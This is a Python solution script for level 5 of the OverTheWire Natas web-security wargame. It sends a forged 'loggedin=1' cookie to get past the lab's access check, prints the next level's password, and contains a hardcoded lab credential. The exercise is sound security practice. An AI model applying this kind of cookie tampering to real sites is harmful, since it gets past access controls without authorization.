# level 5 -> level6

import requests as r 
import re

def auth(username, password, URL,headers):

     with r.session() as s:
        response = s.get(URL, auth =(username,password),headers=headers)
        content =response.text
        print(re.findall("Access granted. The password for natas6 is (.*)</div>", content)[0])


def headers():
    headers = {

        'Cookie' :'loggedin=1' #change the loggedin value from 0 to 1
    }
    return headers

def main():
    username = 'natas5'
    password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'
    URL = f"http://{username}.natas.labs.overthewire.org/"
    header= headers()
    results = auth(username,password,URL,header)

main()